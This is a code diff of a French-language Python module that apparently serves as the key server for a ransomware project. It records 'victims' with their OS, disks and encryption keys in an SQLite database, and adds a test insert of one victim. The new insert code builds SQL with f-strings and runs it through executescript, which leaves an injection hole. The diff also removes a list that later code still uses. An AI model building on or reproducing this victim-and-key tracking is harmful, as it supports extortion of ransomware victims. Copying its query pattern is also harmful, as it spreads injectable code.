@@ -2,16 +2,20 @@ import sqlite3
 connexion = sqlite3.connect("../serveur_cles/data/victims.sqlite")  #BDD dans le fichie
 
 curseur = connexion.cursor()  #Récupération d'un curseur
-list=[]
 
-def ajoutvictim(id,os, hash,disk, key):
-    curseur.executescript("""INSERT INTO victims(id_victim, os, hash, disks, key) VALUES ({id},{os},{hash},{disk},{key});""")
-def ajoutdecrypted(id_decrypted, id_victim,datetime, nb_file):
-    curseur.executescript("""INSERT INTO decrypted(id_decrypted, id_victim, datetime, nb_file) VALUES ({id_decrypted},{id_victim},{datetime},{nb_file});""")
-def ajoutstates(id_state,id_victim ,datetime ,nb_file):
-    curseur.executescript("""INSERT INTO states(id_state, id_victim, datetime, nb_file) VALUES ({id_state},{id_victim},{datetime},{nb_file});""")
-def ajoutencrypted(id_encrypted, id_victim, datetime, nb_file):
-    curseur.executescript("""INSERT INTO encrypted(id_decrypted, id_victim, datetime, nb_file) VALUES ({id_encrypted},{id_victim},{datetime},{nb_file});""")
+#ajouter dans la bd
+def ajoutvictim( id, os, hash, disk, key):
+    sqlAjoutVictim=f'INSERT INTO victims (id_victim, os, hash, disks, key) VALUES ( "{id}", "{os}", "{hash}", "{disk}", "{key}")'
+    print(sqlAjoutVictim)
+    curseur.executescript(sqlAjoutVictim)
+    connexion.commit()
+'''def ajoutdecrypted(id, idvic,date, file):
+    sqlAjoutDecrypted=f'INSERT INTO decrypted (id_decryped, id_victim, datetime, nb_file) VALUES ("{id}", "{idvic}", "{date}", "{file}")'
+    print(sqlAjoutDecrypted)
+    curseur.executescript(sqlAjoutDecrypted)
+    connexion.commit()'''
+#def ajoutstates( id_state,id_victim ,datetime ,nb_file):
+#def ajoutencrypted(id_encrypted, id_victim, datetime, nb_file):
 
 #chercher dans la bd
 #python
@@ -28,7 +32,6 @@ def recup_data_victime(id=False):
         for resultat in resultats:
             list.append(resultat)
         return list
-
-print(recup_data_victime())
+ajoutvictim(1,"linux","oui","E","52414589")
 connexion.close()  #Déconnexion
 
